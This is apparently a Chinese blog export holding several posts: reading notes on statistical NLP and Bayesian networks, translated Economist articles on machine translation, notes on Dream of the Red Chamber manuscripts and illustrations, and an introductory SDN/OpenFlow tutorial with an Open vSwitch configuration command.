如果训练语料与模型应用的领域相脱节，那么模型的效果通常要大打折扣。例如腾讯搜索部门的语言模型，最早使用《人民日报》的语料训练（干净、无噪音），实际效果不佳，之后使用网页的数据，尽管有很多噪音但是训练数据与应用一致，搜索质量反而好。 第四章 谈谈中文分词 早期的分词：《说文解字》和《论语》注解，目的都是为了以一家的理解消除歧义性 分词准确率：不是越高越好，而要看所谓正确的人工分词的数据是如何得来的。我们甚至只能讲某个分词器和另一个分词器相比，与人工分词结果的吻合度稍微高一点而已。目前采用统计语言模型，（选择哪种分词器）效果都差不到哪里去。 第五章 隐含马尔可夫模型计划：201706通读：201709 人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。但是自然语言处理早期的努力都集中在语法、语义和知识表述上，离通信的原理越来越远，而这样答案也就越来越远。当自然语言处理的问题回归到通信系统中的解码问题时，很多难题都迎刃而解了。（p49） 雅格布森（ Roman Jakobson）提出的通信六个要素 1234567891011digraph communicate&#123; label="雅格布森提出的通信六个要素"; 信息和上下文[label = "信息和上下文(发送者)"]; 传递的信息[label = "传递的信息(信道)"]; 接收的信息[label = "接收的信息(接收者)"]; 信息和上下文 -&gt; 传递的信息[label = "编码(S1,S2,S3,···)"]; 传递的信息 -&gt; 接收的信息[label = "解码(O1,O2,O3,···)"];&#125; 马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。 123456789digraph markov&#123; label = " 马尔可夫模型（ Markov Model ）"; rankdir = LR; m1-&gt;m2[label = "1.0"]; m2-&gt;m3[label = "0.6"]; m3-&gt;m4[label = "0.3"]; m2-&gt;m4[label = "0.4"]; m3-&gt;m3[label = "0.7"];&#125; 隐含马尔可夫模型（ Hidden Markov Model ）最早由20世纪六七十年代，美国数学家鲍姆（ Leonard E. Baum ） 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。 123456789101112131415digraph hiddenmarkov&#123; label = " 隐含马尔可夫模型（ Hidden Markov Model ）"; rankdir = LR; S1-&gt;S2[label = ""]; S1-&gt;O1[label = ""]; S2-&gt;S3[label = ""]; S2-&gt;O2[label = ""]; S3-&gt;S4[label = ""]; S3-&gt;O3[label = ""]; S4-&gt;O4[label = ""];&#125; 隐马尔可夫模型的应用隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。 延伸阅读隐含马尔可夫模型的训练 知识背景：概率论 围绕隐含马尔可夫模型的基本问题 给定一个模型，如何计算某个特定输出序列的概率；Forward-Backward 算法参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》 给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列解码算法：维特比算法 给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm） 第六章 信息的度量和作用 信息熵要搞清楚意见非常非常不确定的事，或是我们一无所知的事情，就需要了解大量的信息。相反，如果我们对某件事已经有了较多的了解，那么不需要太多的信息就能把它搞清楚。所以，从这个角度来看，可以认为，信息量就等于不确定性的多少。 信息的作用在英语里，信息和情报是同一个词（ Information ），而我们知道情报的作用就是排除不确定性。 案例：斯大林、日军南下战略情报 如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记。 几乎所有的自然语言处理、信息与信号处理的应用都是一个消除不确定性的过程。 延伸阅读：信息论在信息处理中的应用 信息熵 冗余度 ( Redundancy ) 互信息 ( Mutual Information )，量化地度量相关性 相对熵 ( Relative Entropy 或 Kullback-Leibler Divergence ) 信息论参考文献 《A Mathematic Theory of Communication》(“通信的数学原理”)，香农（ Claude Shannon ）,1948 《Elements of Information Theory》(“信息论基础”)，托马斯·科弗（ Thomas Cover ） 第七章 贾里尼克和现代语言处理第八章 简单之美——布尔代数和搜索引擎的索引第九章 图论和网络爬虫计划：201706通读：20170927 交通路径规划 深度优先搜索（ Depth-First Search , DFS） 广度优先搜索（ Breadth-First Search , BFS） 网络爬虫 ( Web Crawlers ) ：超链接 ( Hyperlinks ) 延伸阅读：图论的亮点补充说明 欧拉七桥问题的证明 构建网络爬虫的工程要点：1）搜索引擎的调度（BFS） 2）页面分析和 URL 的提取 3）记录哪些网页已经下载（ URL 表） 很多数学方法就是这样，看上去没有什么实际用途，但是随着时间的推移会一下子派上大用场。这恐怕是世界上还有很多人毕生研究数学的原因。 第十章 PageRank——Google的民主表决式网页排名技术第十一章 如何确定网页和查询的相关性第十二章 地图和本地搜索的最基本技术——有限状态机和动态规划第十三章 Google AK-47的设计者——阿米特-辛格博士第十四章 余弦定理和新闻的分类第十五章 矩阵运算和文本处理中的两个分类问题第十六章 信息指纹及其应用第十七章 由电视剧《暗算》所想到的——谈谈密码学的数据原理计划：201706 第十八章 闪光的不一定是金子——谈谈搜索引擎反作弊问题第十九章 谈谈数学模型的重要性第二十章 不要把鸡蛋放在一个篮子里——谈谈最大熵模型第二十一章 拼音输入法的数学模型第二十二章 自然语言处理的教父马库斯和他的优秀弟子们第二十三章 布隆过滤器第二十四章 马尔可夫链的扩展——贝叶斯网络计划：201706通读：20170925 贝叶斯网络（Bayesian network） 是一种概率图型模型。 一般而言，贝叶斯网络中的节点表示随机变量，连接两个节点的箭头代表此两个随机变量是具有因果关系的；而两个节点间若没有箭头相互连接一起，表明他们之间没有直接的因果关系（注：并不表明A不会通过其他状态间接地影响状态B）。所有这些（因果）关系，都可以有一个量化的可信度（Belief）,用一个概率描述。也就是说，贝叶斯网络的弧上可以有附加的权重。因此，贝叶斯网络也被称作 信念网络（Belief Networks） 或者 有向无环图模型（directed acyclic graphical model） 。 案例：描述心血管疾病和成因一个简单的贝叶斯网络案例，描述心血管疾病和成因。 12345678910111213digraph diseaseCVD&#123; label=&quot;\n 案例：一个描述心血管疾病和成因的贝叶斯网络 \n&quot;; 心血管疾病-&gt;胆固醇量; 心血管疾病-&gt;血脂; 心血管疾病-&gt;吸烟; 心血管疾病-&gt;运动量; 心血管疾病-&gt;家族病史; 胆固醇量-&gt;运动量; 胆固醇量-&gt;饱和脂肪摄取量; 胆固醇量-&gt;家族病史; 血脂-&gt;饱和脂肪摄取量; 血脂-&gt;家族病史;&#125; 上面的例子进一步简化之后，假定只有三个状态 “心血管疾病”，“高血脂”和“家族病史”。假定每个状态只有“有”、“无”两种，并且给出组合状态的条件概率。 123456digraph SimpleDiseaseCVD&#123; label=&quot;\n 案例：心血管疾病和成因的贝叶斯网络（简化） \n&quot;; 心血管疾病-&gt;高血脂; 心血管疾病-&gt;家族病史; 高血脂-&gt;家族病史;&#125; 心血管疾病 家族病史、高血脂 有 无 有 有 0.9 0.1 有 无 0.4 0.6 有 有 0.4 0.6 有 无 0.1 0.9 高血脂 家族病史 有 无 有 有 0.4 0.6 有 无 0.1 0.9 联合概率分布（贝叶斯公式）： P(家族病史，高血脂，心血管疾病) = P（家族病史|高血脂，心血管疾病）x P（高血脂|家族病史）x P（家族病史） 例如，计算心血管疾病有多大概率是由家族病史引起的。 P(家族病史|有心脏病) = P（有家族病史，有心脏病）/ P（有心脏病） 其中： P(有家族病史，有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂） P(有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂）+ P（无家族病史，有心脏病，无高血脂）+ P（无家族病史，有心脏病，有高血脂） P(有家族病史，有心脏病) = 0.18 x 0.4 + 0.12 x 0.4 = 0.12 P(有心脏病) = 0.12 + 0.08x0.4 + 0.72x0.1 = 0.12 + 0.144 = 0.264 第二十五章 条件随即场和句法分析第二十六章 维特比和他的维特比算法第二十七章 再谈文本自动分类问题——期望最大化算法第二十八章 逻辑回归和搜索广告第二十九章 各个击破算法和Google云计算的基础第三十章 逻辑回归和搜索广告扩展阅读 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 Why draw when you can code? Graphviz 简介 最佳 Graphviz 实践：流程图、数据结构图、网络路径 Trace Route、复杂社会关系链分析、机器学习算法-决策树(Decision Tree) 参考文献 How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>数学与算法</tag>
        <tag>科技史</tag>
        <tag>Develper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:人工智能媒体报道集]]></title>
    <url>%2F2017%2F08%2F29%2FMachine-Learning-News%2F</url>
    <content type="text"><![CDATA[摘要 媒体报道|经济学人：译者的悲伤 | 20170527 媒体报道|经济学人：计算机如何学习人类语言？| 20170111 经济学人：计算机如何学习人类语言？日期：2017年1月11日标题：How machines learned to speak human language副标：And what does that mean for the way people use computers?来源：[http://www.economist.com/blogs/economist-explains/2017/01/economist-explains-6] 今年圣诞节数以百万计的人将得到一种装有电子设备的盒子——能够快速地提高使用人类语言的能力。亚马逊的 Echo 设备，配备了一个名为 Alexa 的数字助理，现在在500多万户家庭中出现。 Echo 是一个圆筒形的台式电脑，除了声音之外没有其它接口。你可以要求 Alexa 播报天气信息，播放音乐，预定出租车，告知通勤路程或讲一个老掉牙的笑话，它都会响应。来自美国电脑巨头的语音驱动式数字助理（谷歌的 Assistant、微软的 Cortana和苹果的 Siri）也已经取得了很大的进步。计算机是如何处理人类语言的问题呢？ 曾经的想法是将教机器学习语言规则，例如翻译，使用一套语法规则来打破源语言的意义，再用另一组用来重现目标语言中的意思。但是经历过20世纪50年代的乐观情绪过后，业界发现这种系统不能用于复杂的新句子；基于语言规则的方法很难大规模扩展应用。用于人类语言识别技术的研究投资进入了长达几十年的蛰伏期，直到20世纪80年代的迎来复兴时期。[注：著名人工智能专家明斯基（达特茅斯会议的发起者之一）对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。弗里德里克-贾里尼克（Frederick Jelinek)及其领导的 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破。] 实际上，人类语言识别技术可以通过模式匹配的形式来自我学习。例如语音识别，计算机一边输入语音文件作为语料，另一边是人工编辑的译本作为的译本。系统学着预测这些语音的结果“听起来”应该属于那个译本。在翻译过程中，训练数据是源语言文本和人工翻译的文本。系统自主学习、匹配它们之间的模式。提高语音识别和翻译能力的一个因素是“语言模型”—— 一个关于英语句子的知识库。这大大缩小了系统的预测工作量。 最近有三件事使这种方法取得了巨大的飞跃：首先，计算机的运算能力比过去强大得多。第二，它们可以从海量的、日益增长的数据中学习，不管是在因特网上公开获取还是公司私下收集的。第三，所谓的“深度学习”（deep learning），它使用包括多层次的数字“神经元”及其连接的数字神经网络，使得该系统非常善于从例子中学习。 所有这一切都意味着，计算机现在非常善于回答具备明确定义的问题。例如 “明天伦敦的气温是多少？” （公平地说，你不必是一台电脑也能知道明天伦敦会下雨）。用户甚至可以用更自然的方式询问，比如“明天我应该带伞去伦敦吗？”（数字助理不断地从人们不同的提问方式中学习），但是问一个开放式的问题（“明天伦敦有什么有趣或者可以薅羊毛的事情吗？”）通常你只会得到一个来自搜索引擎结果的列表。 随着机器学习（ machine learning）的改进，当用户的智能设备更加熟悉他们时，这样的答案将变得更加有用。这意味着隐私倡导者的麻烦，但是参考过去几年手机应用的情况来看，消费者将作出权衡，他们通常非常高兴能获得新功能。 经济学人：译者为何忧虑？日期：2017年5月27日译者：LynnTra@经济学人翻译社链接：http://www.jianshu.com/p/368f14a1e5b6來源：https://www.economist.com/news/books-and-arts/21722609-profession-under-pressure-why-translators-have-blues 翻译(本文仅指笔译)可以是一份孤独的工作，这就很好地解释了为什么大多数翻译选择这项职业是出于自身兴趣，而不是关注度。不久之前，可以说一名合格译员都可以谋得一个稳定体面的生活，但是翻译行业正经历着扭曲的变革，让胆小者感受到谋生之艰。 大多数翻译都是自由职业者，随着因特网的普及，一名合格译员可以入住在肯塔基州但服务于瑞士银行。但是网络互通也导致了激烈的全球竞争，随之即是大幅压价。译员们要么拼命多做或者抢酬劳高的活－这意味着实际翻译的时间少了－要么找一家能帮他们争取到任务的代理机构，但这意味着佣金抽取。除了自己单干或者和代理机构合作，译员还可以在线上市场宣传自身技能，但这暴露了最残忍的竞价压力：像译文千字 13-15 美金这么低的价格也不是没有。以前50美金左右就算低价翻译，那时候文学翻译大概是120美金，高价是250美金。在线上市场，几乎不懂外文和译文质量的买家几乎单纯按价格进行买卖。 职业压力还有另外一个出处：较高质量的机器翻译的涌现。仅仅是一年前，机器翻译的结果还不可靠：内容上不准确，且常不具可读性。而如今这两个缺陷都由基于所谓深度神经网络的翻译引擎大幅改善。几乎可以确定那些报特低价的译员们使用了翻译软件，然后直接针对译文的准确度和可读性进行快速编辑。总体来看，大的翻译机构都对这些科技和其广阔可能性拍手叫好。但是，另译员们本身感受担忧的是，自己的未来除了这种科技大清洗，智力上的愉悦感，别无其它了。对于所有现役译员来说，受影响者都不开心。为了避免成为“未来捡咖啡豆的人”，老译员建议提高专业领域知识和写作技能，以争取高端翻译。但并非人人都能做到。身在普遍性和中端市场的翻译们必然更多的是做编辑工作，否则就是被挤出局。 那剩下的翻译们何去何从呢？其一，文学翻译不受威胁。2001至2015年间，在英国，经翻译的小说售量上升了600％还不止，在美国也一直处于强劲增长中。像埃莱娜·费兰特（Elena Ferrante）这样的大作家也建议这些国家的读者们跳出自己的国度找好书。没人会相信一部机器可以翻译出一本小说。罗伊.雅各布森（Roy Jacobsen）的《看不见的事物》（Unseen）被列入2017年布克国际文学奖（Man Booker International Prize－MBIP）决选名单，原本的挪威岛方言经由唐.巴特利特（Don Bartlett）和唐.肖（Don Shaw）地道译出了带有同样风味的英文：“Hvur bitty it is!”（“How small it is!”“这个真是太小了！”）。MBIP让本书原作者和译者共享奖金，认可了翻译事实上是一种创作。 大多数翻译属于商业翻译，但那也属于一种创作。高管们常常否定一份讲稿或者一封信件的译文，因为那看起来不像他们的原作。但是一名好译员需要再度思考文章本身、重述重要篇章、分解或合并句段，如此等等。翻译软件可以做到准确，但它是逐句翻译。由于语言在考量句子好坏时基于不同的节奏、有不同的期待，因此软件效果可能是一团糟。所以翻译最好的办法只能是先思考原语所指深意，再重新创作。 另一个市场就是“译创”（transcreation），常见于广告业，这里要求译员重新思考一条信息，确保它在新语言（译语）中的版本具备正确的文化参照、笑点等诸如此类，来复刻原语的影响力，跳出语言本身。在这种情况下，“译创员”相比大多数译员来说，更是一名原创作者。 正在被科技重塑的翻译工作很难是一项孤独的工作了。法律、会计以及其它很多可敬的工作正见证着重复性脑力工作由机器完成，效果差强人意。未来的翻译想要做得真好，需要的不仅仅是语言和写作技能，还必须获得客户信任、站在客户角度考虑，就像律所或者会计所的合伙人。换句话说，翻译行业里的孤独者可能举步维艰了。 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 如何创造像样的人造语言 | 大象公会 机器学习翻译和谷歌翻译算法 | Daniil Korbut (Junior Data Scientist at Statsbot)]]></content>
      <tags>
        <tag>Economist</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红学(Redology)]]></title>
    <url>%2F2017%2F08%2F28%2FRedology%2F</url>
    <content type="text"><![CDATA[摘要 版本（脂砚斋点评本（甲戌、乙卯、庚辰）、俄藏本、程高本） 主题：金陵十二钗 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 （清）费丹旭 《十二金钗图册》 红楼故事 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 版本甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”） 现藏：中国上海博物馆 相关人物：胡适（胡适去世后，此本转存于美国康乃尔大学。2005年，中国将此本购回） 简要说明：甲戌，指乾隆十九年（1754年）。共存16回（1—8回，13—16回，25—28回），4回一册，分装为4册。虽然发现年份和标定年代都最早，但一般认为此本为最后审定，准备付印的誊抄本；所依据底稿本应该在庚辰本之后。 此本有脂砚斋一千多条批语，被称为“脂批”，各回皆有朱笔夹批、眉批等。 己卯本（名“脂砚斋四阅评过，己卯冬定本”） 现藏：中国国家图书馆 简要说明：共存42回（1—20回，31—40回，55回后半，56—58回，59回前半，61—63回，65回，66回，68—70回）。因31回—40回这一册的目录页上，有“己卯冬月定本”六个字得名。己卯，指乾隆二十四年（1759年）。 庚辰本（名“脂砚斋四阅评过，庚辰秋定本”） 现藏：中国北京大学图书馆 相关人物：徐星署（原出旗人家中，徐星署1933年初以八银币购于北京东城隆福寺地摊） 简要说明：共存78回（1—80回，缺64回、67回，其68回脱去约600字，估计失去一页）。10回一册，装成8册庚辰，指乾隆二十五年（1760年）。“庚辰本”是至今发现的含有脂批回目最多最完整的一个《红楼梦》版本。庚辰本有甲戌本所缺各回中的2000多条批语，十一回之前，除偶将回前总评与正文抄在一处外，都无批语，为白文本。朱笔批语全集中在第十二回到第二十八回。脂批中署年月名号的几乎都发现于庚辰本，庚辰本的底本年代相当早，留有一些作者和批注者自存本的痕迹； 但抄手不止一人，其文化水平与认真程度都很低。全书讹文脱字，触目皆是。最后一册质量尤差，几难卒读。 俄藏本 现藏：俄罗斯圣彼得堡东方研究所 相关人物：周汝昌 简要：没有总书名，除少数几回名《红楼梦》外，各回皆名《石头记》，存78回（缺5、6回） 程高本相关人物：程伟元、高鹗 程甲本（1791）：程伟元、高鹗于1791年出版的活字印刷本，120回。 程乙本（1792）：程伟元、高鹗于1792年出版的活字印刷本，120回。对程甲本作了不少修改。 流派 索隐派：政治小说蔡元培：1915年《石头记索隐》 考证派：自传胡适：1921年《红楼梦考证》周汝昌：1998年《红楼梦新证》俞平伯：1923年《红楼梦辩》，1952年《红楼梦研究》 文学批评派：美学王国维 主题：金陵十二钗 正册 副册 又副册 林黛玉 香菱 晴雯 薛宝钗 薛宝琴 袭人 贾元春 尤三姐 小红 贾探春 尤二姐 鸳鸯 史湘云 邢岫烟 紫鹃 妙玉 李纹 金钏 贾迎春 李绮 莺儿 贾惜春 宝蟾 司棋 王熙凤 宝珠 玉钏 贾巧姐 瑞珠 茜雪 李纨 平儿 麝月 秦可卿 娇杏 柳五儿 （清）费丹旭 《十二金钗图册》现藏于北京故宫博物院(查看高清) 绢本，设色，每开纵20.3cm，横27.7cm。款署：“辛丑春日为兰汀大兄大人属，晓楼弟费丹旭。辛丑为清道光二十一年（1841年）。钤“子苕”、“丹旭”等印。鉴藏印钤“苍尗过眼”、“笙鱼秘玩”、“宝琅之华”等。后幅有（清）袁松等人跋2段。图中部分人物的面容、衣裙有斑驳的黑污色，这是因为作者所使用的白粉内含有金属成份，在氧化作用下出现返铅的结果。其他著名的插图有王希廉本、聚珍堂本、翰苑楼本、点石斋石印本、云声雨楼石印本以及改琦创作的《红楼梦图咏》、《红楼梦图》、《红楼梦临本》等。 费丹旭作为以擅绘仕女著称的画家，深受《红楼梦》配图之风的感染和启发，他于25岁时便应人之邀绘有具民间风格的《红楼梦人物图》册一本。40岁时，他又受兰汀先生之请绘成此12开图册，每开绘1人，行游于山石、树木、房舍间。作者依据小说的描写和自身对作品的理解描绘出不同人物的年龄、身份、行为特征及其精神气质，图中人物虽未标识姓名，但可以通过画面得以确认。如树下持锄葬花的女子，颇具“风露清愁”的气质，她便是“孤标傲世”的林黛玉；醉卧芍药花丛中的是史湘云；衣着华饰、行于宫苑台阶之上的是贾元春；临窗而坐、展纸吮毫的是贾惜春；灯下托颐沉思的是秦可卿；执扇扑蝶的是为人谨慎的薛宝钗；端坐书几旁、体态虚弱的是妙玉；手扶柴门四下张顾的是巧姐等。 （清）秦祖永《桐阴论画》言费丹旭“补景仕女，香艳中更饶妍雅之致，一树一石，虽未能深入古法，而一种潇洒之致颇极自然。” 判词：二十年来辨是非，榴花开处照宫闱。三春争及初春景，虎兕相逢大梦归。判词：勘破三春景不长,缁衣顿改昔年妆。可怜绣户侯门女,独卧青灯古佛旁。判词：子系中山狼，得志便猖狂。金闺花柳质，一载赴黄粱。判词：才自精明志自高，生于末世运偏消。清明涕送江边望，千里东风一梦遥。判词：凡鸟偏从末世来，都知爱慕此生才。一从二令三人木，哭向金陵事更哀。判词：可叹停机德，堪怜咏絮才；玉带林中挂，金簪雪里埋。判词：可叹停机德，堪怜咏絮才；玉带林中挂，金簪雪里埋。判词：欲洁何曾洁? 云空未必空。可怜金玉质，终陷淖泥中。判词：桃李春风结子完，到头谁似一盆兰。如冰水好空相妒，枉与他人作笑谈。判词：情天情海幻情深，情既相逢必主淫。漫言不肖皆荣出，造衅开端实在宁。判词：富贵又何为？襁褓之间父母违。展眼吊斜晖，湘江水逝楚云飞。 贾巧姐判词：势败休云贵，家亡莫论亲；偶因济刘氏，巧得遇恩人。 参考文献 台北故宫 Open Data 专区]]></content>
      <tags>
        <tag>History</tag>
        <tag>Art</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（二）：OpenFlow]]></title>
    <url>%2F2017%2F08%2F22%2FSDN-OpenFlow%2F</url>
    <content type="text"><![CDATA[摘要 OpenFlow 简史（SDN != OpenFlow ; 版本问题） OpenFlow 工作原理 OpenFlow is a communications protocol 支持 OpenFlow 的开源交换机：Open vSwitch 回顾 SDN 技术指南（一）：架构概览 Background：为什么需要 SDN SDN的主要解决方案 SDN的整体应用架构 History: OpenFlow != SDNOpenFlow 最早由斯坦福大学提出，目前知识产权由开放网络基金会（Open Networking Foundation，ONF)持有。SDN 和 OpenFlow 两个概念经常会被混淆和误读。这也难怪，从历史上看，两者还这是你中有我、我中有你。首先，作为一个开放的协议，OpenFlow 协议是众多 SDN 控制器解决方案的实现基础；另外，定义 SDN 概念和架构背后的许多重要人物开始在 OpenFlow 领域取得了突破，进而推动 SDN 概念走向成熟。 OpenFlow is a key protocol in many SDN solutions. 在传统的网络交换设备中，转发平面（通常采用专门的芯片以提高性能）与控制平面（分布地部署在网络的各个节点）是紧密耦合的，被集成实现在单独的设备中。当然，从另一个角度看这样的设计也有合理性，至少能提高单个节点的灵活性和容灾能力。但是众多厂商各自为政，更出于技术保密、保持市场的考虑，对于开放接口供用户调用、建立行业标准的兴趣不大。OpenFlow 协议的推出突破了传统壁垒，有利于增加用户侧的话语权，所以 Google、Facebook 等企业是 OpenFlow 协议最坚强的拥趸，他们的数据中心都在使用 OpenFlow 协议，并倡议发起成立 ONF 来推动这个技术。 1995: Sun Microsystems 在1995年就提出软件定义网络的概念（在公开 JAVA 编程语言之后不久） 2006: Martin Casado(a PhD students at Stanford)及其团队首次提出了一个集中式安全控制的框架 2008: OpenFlow paper 《Architectural Support for Security Management in Enterprise Networks》 （人物： Nick McKeown 、Scott Shenker 、Dan Boneh） 2009: Stanford 发布 OpenFlow V1.0.0 ; Martin Casado co-founds Nicira （主导 Open vSwitch） 2010: Guido Appenzeller co-founds Big Switch Networks (head of clean slate lab at Stanford) 2011: Open Networking Foundation is formed Oct 2011: First Open Networking Summit. July 2012: VMware buys Nicira for $1.26B Nov 6, 2013: Cisco buys Insieme for $838M OpenFlow 的版本问题OpenFlow 协议简单来说就是把路由器的控制平面（Control Plane，管理路由表、负责网络配置和系统管理等）从转发平面（Forward Plane，转发决策和输出链路调度等）中分离出来，以软件方式实现。从第一个正式商用版本 v1.0 开始，OpenFlow 有先后推出了v1.1,v1.2,v1.3,v1.4 等，版本之间存在不兼容的内容， OpenFlow 交换机或者其它解决方案也存在版本支持不尽相同的情况，版本兼容的问题需要尤其关注。 OpenFlow V1.0 (2009) OpenFlow V1.1 (2011)Ethernet/IP only. Single Flow Table. Did not cover MPLS, Q-in-Q, ECMP, and efficient Multicast. OpenFlow V1.2 (2011)IPv6 Support: Matching fields include IPv6 source address, destination address, protocol number, traffic class. ICMPv6 type, ICMPv6 code, IPv6 neighbor discovery header fields, and IPv6 flow labels.TLV MatchingMultiple controller OpenFlow V1.3 (2012)IPv6 extension headers: Can check if Hop-by-hop, Router, Fragmentation, Destination options, Authentication, Encrypted Security Payload (ESP), unknown extension headers are presentMPLS Bottom-of-Stack bit matchingMAC-in-MACMultiple channels between switch and controller OpenFlow V1.4 (2013)Optical ports: Configure and monitor transmit and receive frequencies of lasers and their powerImproved Extensibility: Type-Length-Value (TLV) encodings at most placesExtended Experimenter Extension API: Can easily add ports, tables, queues, instructions, actions, etc. OpenFlow的工作原理 OpenFlow is a communications protocol. OpenFlow 提供了一个在 SDN 控制器和网络设备（如交换机）之间通讯的标准协议。他允许由 SDN 控制器下发到转发规则（forwarding rules）、安全规则（security rules）到底层网络交换机，完成路由决策、流量控制。OpenFlow 协议相当于一种共同语言，所以SDN 控制器和交换机都需要实现OpenFlow 协议，以便他们能够理解 OpenFlow 消息（message）。 SDN 控制器和交换机之间需要建立通讯连接才能进行配置、管理和监控。通讯连接基于 TCP （或者 TLS）协议之上，监听 6653 端口 。初始化模式：1）网络交换机发起，发送连接请求到控制器 2）控制器发起，交换机需要设置被动模式（ passive mode）开启监听。 无论使用哪种模式，一旦通讯连接建立，OpenFlow 消息将通过 TCP／TLS 连接传递。 基于 OpenFlow 消息，该协议还可以支持网络交换机监控：为了监控网络交换机，OpenFlow 协议提供了从交换机抓取网络统计信息、事件消息的请求／响应报文，方便控制器获得从交换机一侧感知人工操作和失败信息的能力,包括流移除事件，端口状态 UP/DOWN 变化等。为了能够支持第三方厂商可以在 OpenFlow 交换机上执行特定的任务，OpenFlow 协议提供可扩展的自定义消息结构，允许控制器和交换机之间传递信息。那是怎样的 OpenFlow 被许多SDN应用程序用来提供简单的网络控制和管理解决方案。 流表（Flow Table）网络交换机将 SDN 控制器下发的所有规则存储于流表（flow table），例如： ACL 策略（configuring ACL rules） 安全策略（security policy rules） QoS 限速策略（QoS rate limiting bandwidth rules） 路由策略（routing rules） 端口镜像策略（port mirroring rules） 包变更策略（packet modification rules） 大体上，流（flow）中包含三种类型的信息： Match fields：他们将定义在包头字段：L2（源目的地 以太网地址，VLAN ID，VLAN优先级等），L3（IPv4和IPv6 源目的地 地址、协议类型、DSCP、等），L4领域（TCP/UDP/SCTP源目的端口），ARP ICMP字段，字段，MPLS域等等。 Actions：他们将定义一个包是否符合特定条件。例如丢弃（drop），转发到交换机的指定端口，修改数据包（push/pop VLAN ID，push/pop 标签，递增/递减IP TTL），转发到特殊端口的序列等。 计数器：记录由多少数据包匹配到当前flow OpenFlow 协议定义了多种消息来完成交换机和控制机通讯，例如： 连接设置消息（connection setup messages) 配置消息（configuration messages) 交换机统计信息消息（switch statistics messages) 连接监测消息（keep-alive messages) 异步事件消息（asynchronous events messages) 发生错误消息（error messages) 支持 OpenFlow 的开源交换机：Open vSwitch OpenFlow Switches including Open vSwitch. 市场中支持 OpenFlow 的硬件交换机包括 VMware 推出的vSwitch、vDS等虚拟交换机，Cisco与VMware合作发布了基于VMware kernel API开发的分布式虚拟交换机Nexus 1000V（功能对应于VMware的vDS），Citrix 迫于Open vSwitch快速追赶，推出了的Distributed Virtual Switch解决方案，这些方案都是收费的。 除了硬件交换机还可以通过软件支持并实现虚拟机互联，Open vSwitch(Open Source Virtual Switch)就是是一款基于软件实现的开源虚拟交换机。它采用 C 语言编写，遵循 Apache 2.0 许可。 Open vSwitch 的周边生态情况： 支持的操作系统（Linux, Ubuntu, Debian，FreeBSD 和 NetBSD） 支持云计算平台管理系统集成，例如：OpenStack, openQRM, OpenNebula, 和 oVirt 支持虚拟化部署，共享硬件资源（ hypervisor ） 支持云平台 Xen XenServer 6.0 ，也支持 Proxmox VE, VirtualBox, Xen KVM 提供开发工具包：Data Plane Development Kit (DPDK) 接口编程语言支持：C 、Python 支持虚拟机通讯／监控流量统计信息，例如 NetFlow(Cisco，RFC 3954)、sFlow（RFC 3176）、NetStream（Huawei）、IPFIX（RFC 7011）,详见 浅谈基于数据分析的网络态势感知 。 SPAN（Switched Port Analyzer ）, RSPAN（ Remote Switch Port Analyzer）：可以发送一份流量的拷贝给连接安全设备的交换机端口 示例：Open vSwitch 通过命令和控制器建立初始化连接（TCP），控制器 IP （192.168.56.101） 端口（6653）：1ovs-vsctl set-controller &lt;sampleBridgeName&gt; tcp:192.168.56.101:6653 Intel 拥有一个自己的 Open vSwitch 版本，OpenStack 在2011年启动 Quantum 项目，通过引入了Open vSwitch 发展 Open Stack Network 。随着 OpenStack 社区的快速壮大，Open vSwitch 在虚拟交换机的领先优势逐步确立。 Discuss 资讯 | Google’s next OpenFlow challenge: taking SDNs to the consumer,Stacey Higginbotham Apr 17, 2012 专题合辑：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港拟增设网络安全与科技罪案总警司 参考文献 David Mahler: Introduction to 